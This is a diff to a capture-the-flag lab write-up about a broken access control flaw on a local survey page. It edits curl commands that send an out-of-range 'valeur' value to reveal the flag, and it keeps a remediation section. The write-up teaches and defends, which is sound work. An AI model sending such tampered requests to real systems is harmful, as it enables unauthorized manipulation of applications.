@@ -1,15 +1,17 @@
 # Survey Page - Broken Access Control
 
 ## Vulnerability Type
+
 **OWASP A01:2021 - Broken Access Control** (CWE-639: Authorization Bypass Through User-Controlled Key)
 
 ## Summary
 
 page: `http://localhost:8081/index.php?page=survey`
 commands:
+
 ```bash
-curl -X POST "http://localhost:8081/?page=survey" \
-     -d "sujet=42&valeur=42"
+curl "http://localhost:8081/?page=survey" \
+     -d "sujet=2&valeur=42"
 ```
 
 ## Discovery
@@ -23,10 +25,10 @@ sujet=2&valeur=2
 so i changed it to:
 
 ```txt
-sujet=42&valeur=42
+sujet=2&valeur=42
 ```
 
-and got the flag displayed.
+and got the flag displayed. (Only valeur needs to be out of range)
 
 ## using curl
 
@@ -43,6 +45,7 @@ curl -X POST http://localhost:8081/?page=survey \
 4. **No user context check** – Doesn't verify if the request is from the survey owner/admin
 
 ## Remediation
+
 1. **Validate input against whitelist** – Only accept values 1-10 or predefined survey options
 2. **Check authorization** – Verify user owns or can access the survey being modified
 3. **Implement server-side validation** – Never trust client-submitted values
